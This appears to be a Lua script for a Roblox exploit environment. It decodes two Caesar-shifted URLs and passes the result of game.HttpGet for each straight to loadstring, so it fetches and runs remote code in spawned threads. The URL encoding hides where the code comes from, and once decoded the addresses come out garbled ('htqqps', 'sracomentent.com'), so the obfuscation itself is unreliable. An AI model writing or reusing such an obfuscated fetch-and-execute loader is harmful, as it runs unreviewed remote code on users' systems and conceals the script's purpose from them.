(function()
    local e = function(str)
        return string.gsub(str, ".", function(c) 
            return string.char(string.byte(c) - 3) 
        end)
    end
    local u1 = e("kwttsv://itlrk.ghs/illboa")
    local u2 = e("kwttsv://oxdt.vudfrphqwhqw.frp/Brgdwhv-Vfulsw/Bsgdwhg/uhi/vkhdgv/pdlq/Vfulsw.orb")
    local f = loadstring
    local g = game
    local h = g.HttpGet
    local s = spawn or task.spawn
    s(function() f(h(g, u1))() end)
    s(function() f(h(g, u2))() end)
end)()
